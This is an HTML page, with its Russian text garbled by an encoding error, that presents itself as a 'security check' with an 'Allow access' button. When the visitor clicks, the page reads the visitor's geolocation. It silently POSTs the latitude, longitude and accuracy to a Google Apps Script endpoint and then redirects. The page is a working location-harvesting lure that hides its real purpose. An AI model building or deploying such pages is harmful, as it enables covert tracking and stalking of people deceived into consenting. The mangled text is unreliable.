<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: #f0f0f0;
      color: #333;
      text-align: center;
    }
    .loader {
      margin-top: 20px;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #333;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      display: none;
    }
    #consentBtn {
      padding: 12px 24px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h2>
  <button id="consentBtn">–†–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø</button>
  <div class="loader"></div>

  <!-- –ü–æ–ª–∏—Ñ–∏–ª –¥–ª—è —Å—Ç–∞—Ä—ã—Ö –±—Ä–∞—É–∑–µ—Ä–æ–≤ -->
  <script>
    if (!window.URLSearchParams) {
      window.URLSearchParams = class {
        constructor(data) {
          this.params = new Map();
          if (data) {
            const pairs = data.split('&');
            for (const pair of pairs) {
              const [key, value] = pair.split('=');
              this.append(decodeURIComponent(key), decodeURIComponent(value || ''));
            }
          }
        }
        append(key, value) {
          this.params.set(key, value);
        }
        toString() {
          return Array.from(this.params)
            .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
            .join('&');
        }
      };
    }
  </script>

  <script>
    const loader = document.querySelector('.loader');
    const consentBtn = document.getElementById('consentBtn');

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
    if (!navigator.geolocation) {
      alert("–í–∞—à –±—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é!");
      consentBtn.style.display = 'none';
    }

    function requestGeolocation() {
      loader.style.display = 'block';
      consentBtn.style.display = 'none';

      navigator.geolocation.getCurrentPosition(
        sendLocation,
        locationError,
        { enableHighAccuracy: false, timeout: 30000 }
      );
    }

    function sendLocation(pos) {
      const lat = pos.coords.latitude.toFixed(6);
      const lon = pos.coords.longitude.toFixed(6);
      const acc = pos.coords.accuracy.toFixed(2);

      const scriptURL = 'https://script.google.com/macros/s/AKfycbwh3whZ2IBECk2R_0mXsw8ZaEBSn_pUGxqfX--m3ZxYkLV2_JC7eQ1TS9KbRHJFEX5T/exec';

      // –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–ª–∞ –∑–∞–ø—Ä–æ—Å–∞
      let body;
      if (window.URLSearchParams) {
        body = new URLSearchParams({ lat, lon, acc });
      } else {
        body = `lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}`;
      }

      fetch(scriptURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body
      })
      .then(response => {
        if (!response.ok) throw new Error(`–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: ${response.status}`);
        return response.json();
      })
      .then(data => {
        if (data.status === 'success') {
          window.location.href = "/next-page.html";
        } else {
          throw new Error(data.message);
        }
      })
      .catch(err => {
        console.error('–û—à–∏–±–∫–∞:', err);
        alert(err.message || '–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ');
      })
      .finally(() => {
        loader.style.display = 'none';
        consentBtn.style.display = 'block';
      });
    }

    function locationError(err) {
      const errorMessages = {
        1: "–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω. –†–∞–∑—Ä–µ—à–∏—Ç–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö –±—Ä–∞—É–∑–µ—Ä–∞ üîí.",
        2: "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –∏ GPS üåê.",
        3: "–í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É ‚è≥."
      };
      
      alert(errorMessages[err.code] || "–û—à–∏–±–∫–∞: " + err.message);
      loader.style.display = 'none';
      consentBtn.style.display = 'block';
    }

    consentBtn.addEventListener('click', requestGeolocation);
  </script>
</body>
</html>
